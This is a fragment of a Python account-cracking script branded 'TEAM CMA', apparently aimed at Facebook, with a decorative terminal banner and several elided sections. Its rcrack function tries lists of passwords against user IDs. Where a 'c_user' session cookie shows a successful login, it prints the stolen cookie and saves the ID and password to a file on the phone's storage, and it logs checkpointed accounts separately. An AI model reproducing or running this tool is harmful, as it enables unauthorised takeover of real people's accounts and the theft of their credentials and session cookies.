...
\__$$  __|$$  _____|$$  __$$\ $$$\    $$$ |      $$  __$$\ $$$\    $$$ |$$  __$$\ 
   ...
   $$ |   $$ |      $$ |  $$ |$$ |\$  /$$ |      $$ |  $$\ $$ |\$  /$$ |$$ |  $$ |
   $$ |   $$$$$$$$\ $$ |  $$ |$$ | \_/ $$ |      \$$$$$$  |$$ | \_/ $$ |$$ |  $$ |
   \__|   \________|\__|  \__|\__|     \__|       \______/ \__|     \__|\__|  \__|
   
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mıllıllı⭐🌟 M͙e͙h͙e͙d͙i͙ 🌟⭐ıllıllı\33[38;5;196m━━━━━━━━━
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\33[38;5;196m        : [★]TEAM CMA \33[38;5;196m         ┃
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\33[38;5;196m    : [★] TEAM CMA MUSLIM ARMY\33[38;5;196m         ┃
...
\33[38;5;196m     ┃ \033[38;5;46m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\33[38;5;196m    : [★]+880\33[38;5;196m     ┃
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sTEAM CMA\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[TEAM CMA-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/TEAM CMA-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[TEAM CMA-CP💔] {uid} • {ps}")
                open('/sdcard/TEAM CMA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
